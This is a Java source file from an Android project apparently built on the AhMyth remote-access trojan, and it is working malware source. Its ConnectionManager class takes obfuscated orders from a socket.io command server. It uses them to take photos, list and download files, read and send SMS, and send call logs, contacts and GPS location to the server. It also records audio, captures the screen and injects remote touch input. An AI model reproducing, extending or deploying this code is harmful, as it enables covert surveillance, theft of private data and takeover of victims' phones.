package ahmyth.mine.king.ahmyth;

import android.content.Context;
import android.os.Looper;
import android.util.Log;
import org.json.JSONObject;
import io.socket.emitter.Emitter;



/**
 * Created by AhMyth on 10/1/16.
 */

public class ConnectionManager {


    public static Context context;
    private static io.socket.client.Socket ioSocket;
    private static FileManager fm = new FileManager();
    private static InputInjectionManager inputInjector;

    public static void startAsync(Context con)
    {
        try {
            context = con;
            sendReq();
        }catch (Exception ex){
            startAsync(con);
        }

    }


    public static void sendReq() {
try {





    if(ioSocket != null )
        return;

    ioSocket = IOSocket.getInstance().getIoSocket();


    ioSocket.on("ping", new Emitter.Listener() {
        @Override
        public void call(Object... args) {
            ioSocket.emit("pong");
        }
    });

    ioSocket.on("order", new Emitter.Listener() {
        @Override
        public void call(Object... args) {
            try {
                JSONObject data = (JSONObject) args[0];
                String order = data.getString("order");
                Log.e("order",order);
                switch (order){
                    case "x0000ca":
                        if(data.getString("extra").equals("camList"))
                            x0000ca(-1);
                        else if (data.getString("extra").equals("1"))
                            x0000ca(1);
                        else if (data.getString("extra").equals("0"))
                            x0000ca(0);
                        break;
                    case "x0000fm":
                        if (data.getString("extra").equals("ls"))
                            x0000fm(0,data.getString("path"));
                        else if (data.getString("extra").equals("dl"))
                            x0000fm(1,data.getString("path"));
                        break;
                    case "x0000sm":
                        if(data.getString("extra").equals("ls"))
                            x0000sm(0,null,null);
                        else if(data.getString("extra").equals("sendSMS"))
                           x0000sm(1,data.getString("to") , data.getString("sms"));
                        break;
                    case "x0000cl":
                        x0000cl();
                        break;
                    case "x0000cn":
                        x0000cn();
                        break;
                    case "x0000mc":
                            x0000mc(data.getInt("sec"));
                        break;
                    case "x0000lm":
                        x0000lm();
                        break;
                    case "x0000rc":
                        if(data.getString("extra").equals("start"))
                            x0000rc_start();
                        else if(data.getString("extra").equals("stop"))
                            x0000rc_stop();
                        else if(data.getString("extra").equals("touch"))
                            x0000rc_touch(data.getInt("x"), data.getInt("y"), data.getInt("action"));
                        break;


                }



            }catch (Exception e) {
                e.printStackTrace();
            }
        }
    });
    ioSocket.connect();

}catch (Exception ex){

   Log.e("error" , ex.getMessage());

}

    }

    public static void x0000ca(int req){

        if(req == -1) {
           JSONObject cameraList = new CameraManager(context).findCameraList();
            if(cameraList != null)
            ioSocket.emit("x0000ca" ,cameraList );
        }
        else if (req == 1){
            new CameraManager(context).startUp(1);
        }
        else if (req == 0){
            new CameraManager(context).startUp(0);
        }

    }

    public static void x0000fm(int req , String path){
        if(req == 0)
        ioSocket.emit("x0000fm",fm.walk(path));
        else if (req == 1)
            fm.downloadFile(path);
    }


    public static void x0000sm(int req,String phoneNo , String msg){
        if(req == 0)
            ioSocket.emit("x0000sm" , SMSManager.getSMSList());
        else if(req == 1) {
            boolean isSent = SMSManager.sendSMS(phoneNo, msg);
            ioSocket.emit("x0000sm", isSent);
        }
    }

    public static void x0000cl(){
        ioSocket.emit("x0000cl" , CallsManager.getCallsLogs());
    }

    public static void x0000cn(){
        ioSocket.emit("x0000cn" , ContactsManager.getContacts());
    }

    public static void x0000mc(int sec) throws Exception{
        MicManager.startRecording(sec);
    }

    public static void x0000lm() throws Exception{
        Looper.prepare();
        LocManager gps = new LocManager(context);
        JSONObject location = new JSONObject();
        // check if GPS enabled
        if(gps.canGetLocation()){

            double latitude = gps.getLatitude();
            double longitude = gps.getLongitude();
            Log.e("loc" , latitude+"   ,  "+longitude);
            location.put("enable" , true);
            location.put("lat" , latitude);
            location.put("lng" , longitude);
        }
        else
            location.put("enable" , false);

        ioSocket.emit("x0000lm", location);
    }

    // Remote Control: Start screen capture
    public static void x0000rc_start(){
        try {
            if (android.os.Build.VERSION.SDK_INT < android.os.Build.VERSION_CODES.LOLLIPOP) {
                Log.e("RemoteControl", "Screen capture requires API 21+");
                JSONObject response = new JSONObject();
                response.put("success", false);
                response.put("error", "Requires Android 5.0 or higher");
                ioSocket.emit("x0000rc", response);
                return;
            }
            
            // Start screen permission activity
            android.content.Intent intent = new android.content.Intent(context, ScreenPermissionActivity.class);
            intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK);
            context.startActivity(intent);
            
            JSONObject response = new JSONObject();
            response.put("success", true);
            response.put("message", "Screen capture request sent");
            ioSocket.emit("x0000rc", response);
            
        } catch (Exception e) {
            Log.e("RemoteControl", "Error starting screen capture", e);
        }
    }

    // Remote Control: Stop screen capture
    public static void x0000rc_stop(){
        try {
            // Stop screen capture service
            android.content.Intent intent = new android.content.Intent(context, ScreenCaptureService.class);
            intent.setAction("STOP_CAPTURE");
            context.stopService(intent);
            
            JSONObject response = new JSONObject();
            response.put("success", true);
            response.put("message", "Screen capture stopped");
            ioSocket.emit("x0000rc", response);
            
        } catch (Exception e) {
            Log.e("RemoteControl", "Error stopping screen capture", e);
        }
    }

    // Remote Control: Inject touch event
    public static void x0000rc_touch(int x, int y, int action){
        try {
            // Initialize input injector if needed
            if (inputInjector == null) {
                inputInjector = new InputInjectionManager();
            }
            
            if (!inputInjector.isAvailable()) {
                Log.e("RemoteControl", "Input injection not available");
                return;
            }
            
            // Inject touch event
            boolean success = inputInjector.injectTouch(x, y, action);
            
            if (!success) {
                Log.e("RemoteControl", "Failed to inject touch event");
            }
            
        } catch (Exception e) {
            Log.e("RemoteControl", "Error injecting touch event", e);
        }
    }





}
